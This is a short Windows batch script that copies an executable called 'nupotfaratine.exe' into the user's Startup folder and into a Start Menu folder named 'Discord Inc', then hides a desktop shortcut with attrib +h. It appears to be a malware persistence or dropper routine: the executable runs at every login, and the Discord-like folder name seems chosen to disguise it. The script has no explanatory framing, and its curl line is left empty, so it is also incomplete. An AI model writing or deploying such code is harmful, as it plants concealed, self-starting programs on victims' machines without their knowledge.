set startup=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup
set diss=%appdata%\Microsoft\Windows\Start Menu\Programs\Discord Inc
set np=nupotfaratine
set desktop=%userprofile%\Desktop
set mit=Mitos.is The Game

xcopy %np%.exe "%startup%"
xcopy %np%.exe "%diss%"

cd %desktop%

curl 
attrib +h "%mit%.url"

